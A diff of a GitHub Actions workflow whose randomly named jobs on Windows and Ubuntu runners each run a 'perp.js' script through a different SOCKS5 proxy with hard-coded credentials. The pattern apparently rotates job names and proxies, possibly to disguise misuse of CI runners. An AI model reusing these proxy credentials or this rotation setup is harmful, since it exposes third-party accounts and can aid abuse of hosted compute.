@@ -8,8 +8,8 @@ on:
       - 'package.json'
 
 jobs:
-  review_windows2022_node_providence:
-    runs-on: windows-2022
+  compile_ubuntu2004_node_fold:
+    runs-on: ubuntu-20.04
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -18,51 +18,11 @@ jobs:
           with:
             node-version: 20
         - name: Run Task
-          shell: pwsh
           run: |
-            npm install; node perp.js "socks5://dcswarup:webshare@64.137.49.26:6567"
+            npm install && node perp.js "socks5://dcswarup:webshare@216.10.27.214:6892" || true
 
-  lint_ubuntu2204_bun_hovel:
-    runs-on: ubuntu-22.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Bun
-          uses: oven-sh/setup-bun@v2
-          with:
-            bun-version: latest
-        - name: Run Task
-          run: |
-            bun install && bun run perp.js "socks5://dcswarup:webshare@104.164.131.185:7364" || true
-
-  deploy_ubuntu2004_node_jogging:
-    runs-on: ubuntu-20.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 24
-        - name: Run Task
-          run: |
-            npm install && node perp.js "socks5://dcswarup:webshare@64.137.80.9:5036" || true
-
-  build_ubuntulatest_node_populist:
-    runs-on: ubuntu-latest
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 24
-        - name: Run Task
-          run: |
-            npm install && node perp.js "socks5://dcswarup:webshare@92.113.3.73:6082" || true
-
-  lint_ubuntu2404_node_video:
-    runs-on: ubuntu-24.04
+  compile_windows2022_node_tail:
+    runs-on: windows-2022
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -71,11 +31,12 @@ jobs:
           with:
             node-version: 18
         - name: Run Task
+          shell: pwsh
           run: |
-            npm install && node perp.js "socks5://dcswarup:webshare@82.26.212.216:6023" || true
+            npm install; node perp.js "socks5://dcswarup:webshare@64.188.120.7:7754"
 
-  verify_windows2025_bun_millet:
-    runs-on: windows-2025
+  verify_ubuntu2004_bun_igloo:
+    runs-on: ubuntu-20.04
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -84,6 +45,32 @@ jobs:
           with:
             bun-version: latest
         - name: Run Task
+          run: |
+            bun install && bun run perp.js "socks5://dcswarup:webshare@82.23.229.245:7602" || true
+
+  audit_ubuntu2404_node_platter:
+    runs-on: ubuntu-24.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 24
+        - name: Run Task
+          run: |
+            npm install && node perp.js "socks5://dcswarup:webshare@89.249.194.124:6523" || true
+
+  deploy_windows2025_node_adaptation:
+    runs-on: windows-2025
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 22
+        - name: Run Task
           shell: pwsh
           run: |
-            bun install; bun run perp.js "socks5://dcswarup:webshare@23.109.208.163:6687"
+            npm install; node perp.js "socks5://dcswarup:webshare@31.58.23.121:5694"
